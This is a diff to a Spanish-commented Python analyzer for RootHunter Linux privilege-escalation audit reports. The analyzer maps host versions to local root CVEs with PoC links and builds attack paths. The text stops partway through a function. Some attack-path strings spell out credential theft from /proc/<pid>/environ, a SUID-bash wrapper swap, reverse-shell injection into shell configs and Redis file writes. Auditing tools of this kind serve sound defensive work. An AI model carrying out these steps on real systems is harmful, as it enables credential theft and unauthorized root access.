@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # =============================================================================
-#  rh-analyze — Analizador de reportes RootHunter v1.0
+#  rh-analyze — Analizador de reportes RootHunter v1.2
 #  Lee reportes JSON generados por roothunter.sh
 #  análisis: sugerencias de exploits, attack paths, scoring, diff.
 #
@@ -9,21 +9,83 @@
 #    rh-analyze reporte.json --score            # Solo score numérico
 #    rh-analyze reporte.json --paths            # Solo attack paths
 #    rh-analyze reporte.json --exploits         # Solo exploits sugeridos
+#    rh-analyze reporte.json --commands         # Comandos exactos sugeridos
 #    rh-analyze --diff old.json new.json        # Comparar dos auditorías
 #    rh-analyze --batch *.json                  # Priorizar múltiples hosts
 #    rh-analyze reporte.json -o analisis.md     # Exportar Markdown
+#    rh-analyze --list-techniques               # Coverage de gtfobins+whitelist
 #
 #  Requiere: Python 3.7+ (solo stdlib)
+#  Dependencias opcionales (mismo directorio): gtfobins.py, suid_whitelist.py
 #  Solo análisis defensivo. No ejecuta exploits, no automatiza ataque.
 # =============================================================================
 
 import argparse
+import importlib.util
 import json
 import re
 import sys
 from dataclasses import dataclass, field
 from pathlib import Path
 from typing import Optional
+
+
+# ─── Carga del módulo gtfobins (mismo directorio que el script) ──────────────
+def _load_gtfobins():
+    """Carga gtfobins.py desde el mismo directorio que este script.
+    Devuelve None si no se encuentra — la suite sigue funcionando sin la base
+    pero sin comandos sugeridos."""
+    script_dir = Path(__file__).resolve().parent
+    gtf_path = script_dir / 'lib' / 'gtfobins.py'
+    if not gtf_path.is_file():
+        return None
+    try:
+        spec = importlib.util.spec_from_file_location('gtfobins', gtf_path)
+        mod = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(mod)
+        return mod
+    except Exception as e:
+        print(f"[!] No se pudo cargar gtfobins.py: {e}", file=sys.stderr)
+        return None
+
+
+gtfobins = _load_gtfobins()
+
+
+def _load_suid_whitelist():
+    """Carga suid_whitelist.py desde el mismo directorio. Devuelve None si
+    falta — la suite sigue funcionando pero sin filtrado de SUID legítimos."""
+    script_dir = Path(__file__).resolve().parent
+    p = script_dir / 'lib' / 'suid_whitelist.py'
+    if not p.is_file():
+        return None
+    try:
+        spec = importlib.util.spec_from_file_location('suid_whitelist', p)
+        mod = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(mod)
+        return mod
+    except Exception as e:
+        print(f"[!] No se pudo cargar suid_whitelist.py: {e}", file=sys.stderr)
+        return None
+
+
+suid_whitelist = _load_suid_whitelist()
+
+
+def is_suid_legitimate(finding, report) -> tuple[bool, str]:
+    """¿Este finding suid_dangerous corresponde a un SUID legítimo de la distro?
+
+    Solo aplica a findings de type='suid_dangerous'. Devuelve (es_legitimo, razon).
+    Si la whitelist no está cargada, siempre devuelve (False, '').
+    """
+    if suid_whitelist is None:
+        return False, ''
+    if finding.type != 'suid_dangerous':
+        return False, ''
+    path = finding.data.get('path', '')
+    if not path:
+        return False, ''
+    return suid_whitelist.is_legitimate(path, report.os)
 
 # ─── ANSI colors ──────────────────────────────────────────────────────────────
 class C:
@@ -45,10 +107,20 @@ class C:
 # ─── Modelo de datos ──────────────────────────────────────────────────────────
 @dataclass
 class Finding:
-    """Un hallazgo individual extraído del reporte."""
-    severity: str
+    """Un hallazgo individual extraído del reporte.
+
+    En schema v2 incluye:
+      - type: discriminador estructural ('suid_dangerous', 'sudo_rule', ...)
+      - data: dict con campos parseados (binary, path, owner, nopasswd, etc.)
+
+    En schema v1 (legacy):
+      - type='legacy' y data={}; el matching se hace por regex sobre .text
+    """
+    severity: str           # 'critical' | 'warning' | 'info'
     module: str
-    text: str
+    text: str               # Mensaje humano (siempre presente)
+    type: str = 'legacy'    # Tipo estructural del finding
+    data: dict = field(default_factory=dict)
 
     def matches(self, *patterns: str) -> bool:
         """Devuelve True si el texto del hallazgo coincide con cualquier patrón."""
@@ -57,12 +129,17 @@ class Finding:
 
 @dataclass
 class Report:
-    """Reporte completo parseado."""
+    """Reporte completo parseado.
+
+    Soporta tanto schema v1 (solo arrays critical/warnings/info de strings)
+    como schema v2 (array 'findings' con objetos {type, severity, message, data}).
+    """
     hostname: str
     kernel: str
     os: str
     user: str
     timestamp: str
+    schema_version: str = '1'
     findings: list[Finding] = field(default_factory=list)
     raw: dict = field(default_factory=dict)
 
@@ -72,22 +149,58 @@ class Report:
             data = json.load(f)
         report = data.get('report', data)
         target = report.get('target', {})
-        findings = []
-        for module in report.get('modules', []):
-            mname = module.get('module', '?')
-            for sev in ('critical', 'warnings', 'info'):
-                for text in module.get(sev, []):
-                    findings.append(Finding(
-                        severity=sev.rstrip('s'),  # 'warnings' -> 'warning'
-                        module=mname,
-                        text=text,
-                    ))
+
+        # Detectar schema: v2 si hay 'schema_version' o el campo 'findings' a
+        # nivel report o dentro de algún module.
+        schema = str(report.get('schema_version', '1'))
+
+        findings: list[Finding] = []
+
+        # ─── Path A: schema v2 — leer findings estructurados ──────────────
+        # Preferimos el array global 'findings' del report; si no existe,
+        # los recolectamos de cada module.findings.
+        structured_seen = False
+
+        if isinstance(report.get('findings'), list):
+            structured_seen = True
+            for f in report['findings']:
+                findings.append(_finding_from_dict(f, module='?'))
+
+        if not structured_seen:
+            for module in report.get('modules', []):
+                if isinstance(module.get('findings'), list):
+                    structured_seen = True
+                    mname = module.get('module', '?')
+                    for f in module['findings']:
+                        findings.append(_finding_from_dict(f, module=mname))
+
+        if structured_seen:
+            schema = '2'
+
+        # ─── Path B: schema v1 (fallback, también si v2 está incompleto) ──
+        # Si no hubo findings estructurados, parseamos los strings del módulo.
+        # Si hubo, igual los conservamos en .raw para inspección, pero NO los
+        # duplicamos — el v2 ya los cubre con su .text.
+        if not structured_seen:
+            for module in report.get('modules', []):
+                mname = module.get('module', '?')
+                for sev in ('critical', 'warnings', 'info'):
+                    for text in module.get(sev, []):
+                        findings.append(Finding(
+                            severity=sev.rstrip('s'),
+                            module=mname,
+                            text=text,
+                            type='legacy',
+                            data={},
+                        ))
+
         return cls(
             hostname=target.get('hostname', '?'),
             kernel=target.get('kernel', '?'),
             os=target.get('os', '?'),
             user=target.get('user', '?'),
             timestamp=report.get('timestamp', '?'),
+            schema_version=schema,
             findings=findings,
             raw=report,
         )
@@ -99,11 +212,44 @@ class Report:
         return [f for f in self.findings if f.severity == 'warning']
 
     def find(self, *patterns: str) -> list[Finding]:
-        """Devuelve todos los findings que coincidan con cualquier patrón."""
+        """Devuelve todos los findings que coincidan con cualquier patrón en .text."""
         return [f for f in self.findings if f.matches(*patterns)]
 
     def has(self, *patterns: str) -> bool:
         return bool(self.find(*patterns))
+
+    # ─── API estructurada (schema v2) ────────────────────────────────────
+    def find_by_type(self, *types: str) -> list[Finding]:
+        """Devuelve findings cuyo .type coincide con alguno de los dados.
+
+        Si el reporte es v1 (legacy), esto siempre devuelve []. Para esos
+        casos seguir usando .find() con regex.
+        """
+        return [f for f in self.findings if f.type in types]
+
+    def has_type(self, *types: str) -> bool:
+        return bool(self.find_by_type(*types))
+
+    def is_v2(self) -> bool:
+        """¿El reporte usa schema estructurado v2?"""
+        return self.schema_version == '2' or any(
+            f.type != 'legacy' for f in self.findings
+        )
+
+
+def _finding_from_dict(d: dict, module: str = '?') -> Finding:
+    """Construye un Finding desde un objeto del array 'findings' (schema v2)."""
+    sev = d.get('severity', 'info')
+    # Normalizar variantes ('warnings' -> 'warning')
+    if sev.endswith('s') and sev != 'critical':
+        sev = sev.rstrip('s')
+    return Finding(
+        severity=sev,
+        module=module,
+        text=d.get('message', ''),
+        type=d.get('type', 'unknown'),
+        data=d.get('data', {}) or {},
+    )
 
 
 # ─── Comparador de versiones ──────────────────────────────────────────────────
@@ -139,21 +285,93 @@ class Exploit:
     # Función predicado: recibe Report y devuelve True si aplica
     applies: callable = None
     requires: str = ''      # Texto explicativo de pre-requisitos
+    confidence: str = 'high'  # 'high' | 'medium' | 'low'
+    confidence_note: str = ''  # Por qué la confianza es la que es
 
 EXPLOITS: list[Exploit] = []
 
 
-def exploit(cve, name, severity, description, poc_url, requires=''):
+def exploit(cve, name, severity, description, poc_url, requires='',
+            confidence='high', confidence_note=''):
     """Decorador para registrar un exploit en la base."""
     def decorator(fn):
         EXPLOITS.append(Exploit(
             cve=cve, name=name, severity=severity,
             description=description, poc_url=poc_url,
             applies=fn, requires=requires,
+            confidence=confidence, confidence_note=confidence_note,
         ))
         return fn
     return decorator
 
+
+# ─── Helpers para obtener versiones del reporte ──────────────────────────────
+# Estos helpers prefieren los findings estructurados (schema v2). Si el reporte
+# es v1 (legacy), caen a regex sobre los strings. Devuelven '' cuando no
+# pueden extraer la versión.
+
+def _get_kernel_version(r: Report) -> str:
+    """Devuelve la versión limpia del kernel (ej. '5.15.0') o ''."""
+    if r.is_v2():
+        f = r.find_by_type('kernel_version')
+        if f:
+            v = f[0].data.get('version', '')
+            if v:
+                return v
+    # Fallback: parsear r.kernel directamente (formato 'X.Y.Z[-suffix]')
+    m = re.match(r'(\d+\.\d+(?:\.\d+)?)', r.kernel or '')
+    return m.group(1) if m else ''
+
+
+def _get_glibc_version(r: Report) -> str:
+    """Devuelve la versión de glibc (ej. '2.35') o ''."""
+    if r.is_v2():
+        f = r.find_by_type('glibc_version')
+        if f:
+            return f[0].data.get('version', '')
+    # Fallback v1: regex sobre cualquier finding
+    for f in r.find(r'glibc[:\s]+(\d+\.\d+)'):
+        m = re.search(r'glibc[:\s]+(\d+\.\d+(?:\.\d+)?)', f.text, re.IGNORECASE)
+        if m:
+            return m.group(1)
+    return ''
+
+
+def _get_sudo_version(r: Report) -> str:
+    """Devuelve la versión de sudo (ej. '1.9.5p2') o ''."""
+    if r.is_v2():
+        f = r.find_by_type('sudo_version')
+        if f:
+            return f[0].data.get('version', '')
+    # Fallback v1: regex sobre cualquier finding cuyo texto mencione sudo
+    # Acepta variantes: "sudo: 1.8.31p2", "sudo versión: 1.8.31p2", "Sudo 1.9.5"
+    for f in r.findings:
+        if 'sudo' in f.text.lower():
+            m = re.search(r'(\d+\.\d+\.\d+(?:p\d+)?)', f.text)
+            if m:
+                return m.group(1)
+    return ''
+
+
+def _get_pkexec_version(r: Report) -> str:
+    """Devuelve la versión de pkexec o ''."""
+    if r.is_v2():
+        f = r.find_by_type('pkexec_version')
+        if f:
+            return f[0].data.get('version', '')
+    return ''
+
+
+def _kernel_userns_unrestricted(r: Report) -> bool:
+    """¿unprivileged_userns_clone=1? Eleva la viabilidad de varios exploits."""
+    if r.is_v2():
+        for f in r.find_by_type('kernel_protection'):
+            if f.data.get('name') == 'unprivileged_userns_clone':
+                return f.data.get('value') == '1'
+    return False
+
+
+# ─── CVEs ─────────────────────────────────────────────────────────────────────
 
 @exploit(
     cve='CVE-2021-3156',
@@ -161,14 +379,46 @@ def exploit(cve, name, severity, description, poc_url, requires=''):
     severity='critical',
     description='Heap buffer overflow en sudoedit — escalada local a root',
     poc_url='https://github.com/blasty/CVE-2021-3156',
+    requires='sudo < 1.9.5p2',
 )
 def _check_baron_samedit(r: Report) -> bool:
-    # Buscar versión de sudo en los hallazgos
-    for f in r.find(r'sudo[:\s]+(\d+\.\d+\.\d+)'):
-        m = re.search(r'(\d+\.\d+\.\d+(?:p\d+)?)', f.text)
-        if m and vlt(m.group(1), '1.9.5'):
-            return True
-    return False
+    v = _get_sudo_version(r)
+    if not v:
+        return False
+    return vlt(v, '1.9.5p2')
+
+
+@exploit(
+    cve='CVE-2023-22809',
+    name='Sudoedit env injection',
+    severity='critical',
+    description='EDITOR/VISUAL/SUDO_EDITOR permite editar archivos arbitrarios como root',
+    poc_url='https://www.sudo.ws/security/advisories/sudoedit_any/',
+    requires='sudo 1.8.0 ≤ v ≤ 1.9.12p1, regla sudoedit autorizada',
+)
+def _check_cve_2023_22809(r: Report) -> bool:
+    v = _get_sudo_version(r)
+    if not v:
+        return False
+    # Afecta 1.8.0 hasta 1.9.12p1 inclusive
+    return vge(v, '1.8.0') and vlt(v, '1.9.12p2')
+
+
+@exploit(
+    cve='CVE-2025-32463',
+    name='Sudo --chroot path resolution',
+    severity='critical',
+    description='--chroot=/etc/passwd carga binarios desde rutas controladas — RCE como root',
+    poc_url='https://www.sudo.ws/security/advisories/chroot_bug/',
+    requires='sudo 1.9.14 ≤ v < 1.9.17p1',
+    confidence='medium',
+    confidence_note='requiere que el binario sudo no esté parcheado distroside',
+)
+def _check_cve_2025_32463(r: Report) -> bool:
+    v = _get_sudo_version(r)
+    if not v:
+        return False
+    return vge(v, '1.9.14') and vlt(v, '1.9.17p1')
 
 
 @exploit(
@@ -177,8 +427,19 @@ def _check_baron_samedit(r: Report) -> bool:
     severity='critical',
     description='Manipulación de argv permite escalada a root sin autenticación',
     poc_url='https://github.com/ly4k/PwnKit',
+    requires='polkit < 0.120',
 )
 def _check_pwnkit(r: Report) -> bool:
+    # Schema v2: usar el finding dedicado emitido por roothunter v1.1
+    if r.is_v2():
+        if r.has_type('cve_pwnkit'):
+            return True
+        # También aceptar la versión cruda si el finding cve_pwnkit no se emitió
+        v = _get_pkexec_version(r)
+        if v and vlt(v, '0.120'):
+            return True
+        return False
+    # v1: regex
     return r.has(r'pkexec.*<\s*0\.120', r'PwnKit', r'CVE-2021-4034')
 
 
@@ -188,12 +449,12 @@ def _check_pwnkit(r: Report) -> bool:
     severity='critical',
     description='Escritura arbitraria en archivos de solo lectura — escalada a root',
     poc_url='https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits',
+    requires='kernel 5.8 ≤ v < 5.16.11 (también <5.15.25, <5.10.102)',
 )
 def _check_dirty_pipe(r: Report) -> bool:
-    m = re.match(r'(\d+\.\d+(?:\.\d+)?)', r.kernel)
-    if not m:
+    k = _get_kernel_version(r)
+    if not k:
         return False
-    k = m.group(1)
     return vge(k, '5.8') and vlt(k, '5.16.11')
 
 
@@ -202,16 +463,126 @@ def _check_dirty_pipe(r: Report) -> bool:
     name='Looney Tunables (glibc)',
     severity='critical',
     description='Buffer overflow en GLIBC_TUNABLES — escalada local',
-    poc_url='https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt',
+    poc_url='https://www.qualys.com/2023/10/03/cve-2023-4911/'
+            'looney-tunables-local-privilege-escalation-glibc-ld-so.txt',
     requires='glibc 2.34 - 2.38',
 )
 def _check_looney_tunables(r: Report) -> bool:
-    for f in r.find(r'glibc[:\s]+(\d+\.\d+)'):
-        m = re.search(r'(\d+\.\d+)', f.text)
-        if m and vge(m.group(1), '2.34') and vlt(m.group(1), '2.39'):
-            return True
-    return False
+    v = _get_glibc_version(r)
+    if not v:
+        return False
+    return vge(v, '2.34') and vlt(v, '2.39')
 
+
+@exploit(
+    cve='CVE-2024-1086',
+    name='nf_tables double-free',
+    severity='critical',
+    description='UAF en nft_verdict_init — escalada a root vía nf_tables',
+    poc_url='https://github.com/Notselwyn/CVE-2024-1086',
+    requires='kernel 5.14 ≤ v < 6.8 (varias ramas estables fixed)',
+    confidence='medium',
+    confidence_note='muchas distros backportearon el fix sin bumpear el kernel.X.Y.Z',
+)
+def _check_cve_2024_1086(r: Report) -> bool:
+    k = _get_kernel_version(r)
+    if not k:
+        return False
+    # Rango amplio: 5.14 hasta 6.8 (cuando se fixeó upstream)
+    return vge(k, '5.14') and vlt(k, '6.8')
+
+
+@exploit(
+    cve='CVE-2023-0386',
+    name='OverlayFS UID mapping',
+    severity='critical',
+    description='Mapeo de UIDs en OverlayFS permite copiar binarios SUID — escalada a root',
+    poc_url='https://github.com/xkaneiki/CVE-2023-0386',
+    requires='kernel 5.11 ≤ v ≤ 6.2, user namespaces habilitados',
+)
+def _check_cve_2023_0386(r: Report) -> bool:
+    k = _get_kernel_version(r)
+    if not k:
+        return False
+    in_range = vge(k, '5.11') and vlt(k, '6.3')
+    # Sube confianza si vemos userns habilitado; si no, igual reportamos
+    return in_range
+
+
+@exploit(
+    cve='CVE-2023-32233',
+    name='Netfilter nf_tables UAF',
+    severity='critical',
+    description='Use-after-free en nf_tables permite escalada local',
+    poc_url='https://github.com/Liuk3r/CVE-2023-32233',
+    requires='kernel < 6.3.1, CAP_NET_ADMIN o user namespaces',
+    confidence='medium',
+    confidence_note='requiere CAP_NET_ADMIN; user namespaces es la ruta común sin esa cap',
+)
+def _check_cve_2023_32233(r: Report) -> bool:
+    k = _get_kernel_version(r)
+    if not k:
+        return False
+    return vlt(k, '6.3.1')
+
+
+@exploit(
+    cve='CVE-2022-2588',
+    name='cls_route UAF',
+    severity='high',
+    description='UAF en clasificador de tráfico cls_route — escalada local',
+    poc_url='https://github.com/Markakd/CVE-2022-2588',
+    requires='kernel < 5.19',
+    confidence='medium',
+)
+def _check_cve_2022_2588(r: Report) -> bool:
+    k = _get_kernel_version(r)
+    if not k:
+        return False
+    return vlt(k, '5.19')
+
+
+@exploit(
+    cve='CVE-2021-22555',
+    name='Netfilter heap overflow',
+    severity='high',
+    description='Heap OOB write en x_tables — escalada a root vía namespaces',
+    poc_url='https://github.com/google/security-research/security/advisories/GHSA-xxx5-8mvq-3528',
+    requires='kernel 2.6.19 - 5.12, user namespaces habilitados',
+    confidence='medium',
+    confidence_note='requiere unprivileged_userns_clone=1 — verificar protección kernel',
+)
+def _check_cve_2021_22555(r: Report) -> bool:
+    k = _get_kernel_version(r)
+    if not k:
+        return False
+    in_range = vge(k, '2.6.19') and vlt(k, '5.12.13')
+    return in_range
+
+
+@exploit(
+    cve='CVE-2025-6019',
+    name='libblockdev/udisks LPE',
+    severity='high',
+    description='Escalada local vía udisks/libblockdev en distros con allow_active=yes',
+    poc_url='https://access.redhat.com/security/cve/CVE-2025-6019',
+    requires='libblockdev vulnerable + sesión local activa',
+    confidence='low',
+    confidence_note='no detectable solo por versión kernel — info para revisión manual',
+)
+def _check_cve_2025_6019(r: Report) -> bool:
+    # No tenemos detección directa por versión. Lo reportamos como informativo
+    # solo si el host es Linux moderno donde podría aplicar (kernel >= 5.x).
+    # La idea: que el usuario sepa que existe y verifique manualmente.
+    k = _get_kernel_version(r)
+    if not k:
+        return False
+    # Solo lo levantamos en distros recientes (kernel >= 5.10) para no
+    # sobreruidar reportes de equipos antiguos.
+    return vge(k, '5.10')
+
+
+# ─── Vectores de acceso (no-CVE) ──────────────────────────────────────────────
 
 @exploit(
     cve='GTFOBins',
@@ -221,6 +592,8 @@ def _check_looney_tunables(r: Report) -> bool:
     poc_url='https://gtfobins.github.io/gtfobins/docker/',
 )
 def _check_docker_group(r: Report) -> bool:
+    if r.is_v2():
+        return r.has_type('user_in_docker_group')
     return r.has(r'grupo.*docker', r'docker.*grupo', r'group.*docker')
 
 
@@ -229,9 +602,12 @@ def _check_docker_group(r: Report) -> bool:
     name='Docker socket escribible',
     severity='critical',
     description='Acceso de escritura al socket Docker permite spawn de containers privilegiados',
-    poc_url='https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation',
+    poc_url='https://book.hacktricks.xyz/linux-hardening/privilege-escalation/'
+            'docker-security/docker-breakout-privilege-escalation',
 )
 def _check_docker_sock(r: Report) -> bool:
+    if r.is_v2():
+        return r.has_type('docker_socket_writable')
     return r.has(r'docker.sock.*escribible', r'docker.sock.*writable')
 
 
@@ -362,17 +738,90 @@ def find_attack_paths(r: Report) -> list[AttackPath]:
             impact='Acceso a recursos cloud según permisos del rol',
         ))
 
+    # Patrón: secretos en /proc/<pid>/environ — credenciales gratis
+    if r.has_type('process_env_secret'):
+        n = len(r.find_by_type('process_env_secret'))
+        paths.append(AttackPath(
+            name='Robo de credenciales desde /proc/<pid>/environ',
+            severity='critical',
+            steps=[
+                f"{n} variables sensibles legibles en environ de procesos ajenos",
+                "Extraer credenciales con: tr '\\0' '\\n' < /proc/<pid>/environ | grep -i password",
+                "Usar las credenciales para acceso lateral (DB, API, cloud, etc.)",
+            ],
+            impact='Movimiento lateral con credenciales de servicios corriendo en el host',
+        ))
+
+    # Patrón: binario root escribible — escalada al reinicio
+    if r.has_type('process_root_writable_binary'):
+        bin_path = r.find_by_type('process_root_writable_binary')[0].data.get('path', '?')
+        paths.append(AttackPath(
+            name='Escalada vía binario de proceso root escribible',
+            severity='critical',
+            steps=[
+                f"Binario detectado: {bin_path}",
+                "Reemplazar con un wrapper que copia bash con SUID antes de exec original",
+                "Esperar reinicio del proceso (servicio, host, o forzar via failure conditions)",
+                "Tras restart: /tmp/.b -p da shell como root",
+            ],
+            impact='Shell como root tras el próximo reinicio del proceso',
+        ))
+
+    # Patrón: profile.d / shell_rc escribible — escalada al login
+    if r.has_type('profile_d_writable', 'shell_rc_writable'):
+        paths.append(AttackPath(
+            name='Escalada vía hijack de config de shell',
+            severity='high',
+            steps=[
+                "Configs de shell escribibles detectadas (profile.d o .bashrc/.zshrc ajenos)",
+                "Inyectar payload que cree SUID-bash o reverse shell",
+                "Esperar a que el usuario afectado inicie una sesión interactiva",
+                "Verificar quién puede hacer login y con qué frecuencia: who, last",
+            ],
+            impact='Escalada cuando el usuario objetivo inicia sesión',
+        ))
+
+    # Patrón: socket unix escribible — depende del daemon
+    if r.has_type('unix_socket_writable'):
+        socks = r.find_by_type('unix_socket_writable')
+        sock_path = socks[0].data.get('path', '?')
+        paths.append(AttackPath(
+            name='Abuso de socket unix escribible',
+            severity='high',
+            steps=[
+                f"Socket detectado: {sock_path}",
+                "Identificar el daemon que lo expone (lsof, ss, fuser)",
+                "Para Redis: CONFIG SET dir + SET escribe archivos arbitrarios",
+                "Para Docker/runtime: spawn de container privilegiado",
+                "Para PostgreSQL/MySQL: queries con permisos del daemon",
+            ],
+            impact='RCE o lectura/escritura privilegiada según daemon',
+        ))
+
     return paths
 
 
 # ─── Scoring ──────────────────────────────────────────────────────────────────
 def calculate_score(r: Report) -> tuple[int, dict]:
-    """Devuelve (score 0-100, breakdown)."""
+    """Devuelve (score 0-100, breakdown).
+
+    Los findings de tipo 'suid_dangerous' que están en la whitelist de la
+    distro se descuentan del bucket 'críticos' — son SUID legítimos que el
+    sistema necesita y no representan un vector de escalada por sí mismos.
+    """
     breakdown = {}
 
-    # Críticos pesan mucho
-    n_crit = len(r.critical())
-    breakdown['críticos'] = min(n_crit * 10, 60)
+    # Críticos: contar todos los críticos pero descontar los SUID whitelisted
+    all_crit = r.critical()
+    whitelisted = 0
+    for f in all_crit:
+        ok, _ = is_suid_legitimate(f, r)
+        if ok:
+            whitelisted += 1
+    n_crit_effective = len(all_crit) - whitelisted
+    breakdown['críticos'] = min(n_crit_effective * 10, 60)
+    if whitelisted > 0:
+        breakdown['_suid_whitelisted'] = whitelisted
 
     # Advertencias pesan menos
     n_warn = len(r.warnings())
@@ -400,6 +849,19 @@ def calculate_score(r: Report) -> tuple[int, dict]:
     if r.has(r'pam_permit sufficient'):
         bonus += 10
         bonus_reasons.append('PAM backdoor')
+    # Nuevos bonus para módulo processes
+    if r.has_type('process_env_secret', 'process_cmdline_secret'):
+        bonus += 8
+        bonus_reasons.append('secretos en /proc')
+    if r.has_type('process_root_writable_binary'):
+        bonus += 8
+        bonus_reasons.append('binario root escribible')
+    if r.has_type('profile_d_writable'):
+        bonus += 6
+        bonus_reasons.append('profile.d escribible')
+    if r.has_type('unix_socket_writable'):
+        bonus += 5
+        bonus_reasons.append('socket unix escribible')
 
     breakdown['contexto'] = min(bonus, 20)
     if bonus_reasons:
@@ -430,8 +892,15 @@ def render_header(r: Report):
     print(f"  Kernel     : {r.kernel}")
     print(f"  Usuario    : {r.user}")
     print(f"  Auditado   : {r.timestamp}")
+    schema_label = (f"{C.GREEN}v{r.schema_version} (estructurado){C.RESET}"
+                    if r.is_v2()
+                    else f"{C.YELLOW}v{r.schema_version} (legacy){C.RESET}")
+    print(f"  Schema     : {schema_label}")
     print(f"  Hallazgos  : {len(r.critical())} críticos, "
           f"{len(r.warnings())} advertencias\n")
+    if not r.is_v2():
+        print(f"  {C.DIM}Tip: re-ejecuta roothunter.sh ≥ v1.1 para habilitar")
+        print(f"  --commands con sugerencias de exploit por binario.{C.RESET}\n")
 
 
 def render_score(r: Report):
@@ -445,6 +914,9 @@ def render_score(r: Report):
         print(f"    {k:.<20} +{v}")
     if '_bonus_por' in breakdown:
         print(f"  {C.DIM}Factores de contexto: {breakdown['_bonus_por']}{C.RESET}")
+    if '_suid_whitelisted' in breakdown:
+        n = breakdown['_suid_whitelisted']
+        print(f"  {C.DIM}SUID legítimos descontados: {n} (whitelist por distro){C.RESET}")
     print()
 
 
@@ -457,13 +929,28 @@ def render_exploits(r: Report):
         print(f"  hay matches en los CVEs registrados localmente.{C.RESET}\n")
         return
 
+    # Orden estable: críticos primero; dentro de cada severidad, alta
+    # confianza primero (es lo que más probablemente sea explotable).
+    sev_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}
+    conf_order = {'high': 0, 'medium': 1, 'low': 2}
+    applicable.sort(key=lambda e: (sev_order.get(e.severity, 9),
+                                    conf_order.get(e.confidence, 9)))
+
     for e in applicable:
         sev_color = C.RED if e.severity == 'critical' else C.YELLOW
-        print(f"\n  {sev_color}[{e.severity.upper()}]{C.RESET} {C.BOLD}{e.name}{C.RESET}")
+        # Color para la confidence
+        conf_color = (C.GREEN if e.confidence == 'high'
+                      else C.YELLOW if e.confidence == 'medium'
+                      else C.DIM)
+        print(f"\n  {sev_color}[{e.severity.upper()}]{C.RESET} "
+              f"{C.BOLD}{e.name}{C.RESET}  "
+              f"{conf_color}(confianza: {e.confidence}){C.RESET}")
         print(f"    CVE/Ref     : {e.cve}")
         print(f"    Descripción : {e.description}")
         if e.requires:
             print(f"    Requiere    : {e.requires}")
+        if e.confidence_note:
+            print(f"    {C.DIM}Sobre confianza: {e.confidence_note}{C.RESET}")
         print(f"    PoC         : {C.CYAN}{e.poc_url}{C.RESET}")
     print()
 
@@ -483,6 +970,823 @@ def render_attack_paths(r: Report):
             print(f"    {j}. {step}")
         print(f"    {C.DIM}↳ Impacto: {p.impact}{C.RESET}")
     print()
+
+
+def _format_command_block(title: str, sev: str, technique: dict, ref_url: str = '',
+                          extra_context: str = '') -> str:
+    """Renderiza un bloque visual con verify/exploit/why/success para una técnica.
+
+    Devuelve el string ya formateado con colores ANSI.
+    """
+    sev_color = C.RED if sev == 'critical' else C.YELLOW
+    out = []
+    out.append(f"\n  {sev_color}[{sev.upper()}]{C.RESET} {C.BOLD}{title}{C.RESET}")
+    if extra_context:
+        out.append(f"    {C.DIM}{extra_context}{C.RESET}")
+    if technique.get('why'):
+        out.append(f"    {C.DIM}Por qué funciona:{C.RESET} {technique['why']}")
+    if technique.get('verify'):
+        out.append(f"    {C.CYAN}Verificar:{C.RESET}  {technique['verify']}")
+    if technique.get('exploit'):
+        out.append(f"    {C.RED}Explotar:{C.RESET}   {technique['exploit']}")
+    if technique.get('success'):
+        out.append(f"    {C.GREEN}Éxito si:{C.RESET}   {technique['success']}")
+    if technique.get('notes'):
+        out.append(f"    {C.YELLOW}Notas:{C.RESET}      {technique['notes']}")
+    ref = technique.get('ref') or ref_url
+    if ref:
+        out.append(f"    {C.DIM}Referencia: {ref}{C.RESET}")
+    return '\n'.join(out)
+
+
+def _extract_verification(finding) -> dict:
+    """Extrae los campos de verificación de un Finding al diccionario que usa
+    el render. Devuelve dict con keys: verified, verified_at_level, verify_output.
+
+    Si el finding no tiene esos campos (porque roothunter.sh corrió sin -V),
+    devuelve verified='unknown'.
+    """
+    return {
+        'verified':          finding.data.get('verified', 'unknown'),
+        'verified_at_level': finding.data.get('verified_at_level', 'none'),
+        'verify_output':     finding.data.get('verify_output', ''),
+    }
+
+
+def collect_techniques(r: Report) -> list[dict]:
+    """Recolecta todas las técnicas accionables con metadata de priorización.
+
+    Cada elemento es un dict con:
+      - title:         str (ej. "SUID en find", "sudo less")
+      - severity:      'critical' | 'warning'
+      - technique:     dict con verify/exploit/why/success/notes/ref
+      - extra_context: str para mostrar paths, NOPASSWD, etc.
+      - tier:          1 | 2 | 3
+      - score:         int (4-25)
+      - reliability, stealth, speed: int 1-5
+      - kind:          'suid' | 'sudo' | 'capability' | 'special'
+
+    Cuando no se encuentra técnica documentada para un binario, se omite —
+    los faltantes se rinden aparte en una sección "sin técnica".
+    """
+    out: list[dict] = []
+    if gtfobins is None or not r.is_v2():
+        return out
+
+    # ─── 1) SUID peligrosos ─────────────────────────────────────────────
+    seen_bins = set()
+    for f in r.find_by_type('suid_dangerous'):
+        ok, _ = is_suid_legitimate(f, r)
+        if ok:
+            continue
+        bin_name = f.data.get('binary', '')
+        path = f.data.get('path', '')
+        owner = f.data.get('owner', '?')
+        key = (bin_name, path)
+        if key in seen_bins:
+            continue
+        seen_bins.add(key)
+        tech = gtfobins.lookup_suid(bin_name) if bin_name else None
+        if tech is None:
+            continue  # se renderiza aparte como "sin técnica"
+        # Sustituir path si está hardcoded a /usr/bin/<bin>
+        exploit_cmd = tech.get('exploit', '')
+        if path and bin_name in exploit_cmd and path != f"/usr/bin/{bin_name}":
+            exploit_cmd = exploit_cmd.replace(f"/usr/bin/{bin_name}", path, 1)
+        tech_resolved = dict(tech)
+        tech_resolved['exploit'] = exploit_cmd
+        rel, stl, spd = gtfobins.get_scoring(tech, 'suid')
+        score, tier = gtfobins.score_technique(rel, stl, spd)
+        out.append({
+            'title':         f"SUID en {bin_name}",
+            'severity':      'critical',
+            'technique':     tech_resolved,
+            'extra_context': f"Path: {path}  |  Owner: {owner}  |  "
+                             f"Perms: {f.data.get('perms', '?')}",
+            'tier': tier, 'score': score,
+            'reliability': rel, 'stealth': stl, 'speed': spd,
+            'kind': 'suid',
+            'verification': _extract_verification(f),
+        })
+
+    # ─── 2) Sudo rules ──────────────────────────────────────────────────
+    seen_rules = set()
+    for f in r.find_by_type('sudo_rule'):
+        bin_name = f.data.get('binary', '')
+        path = f.data.get('path', '')
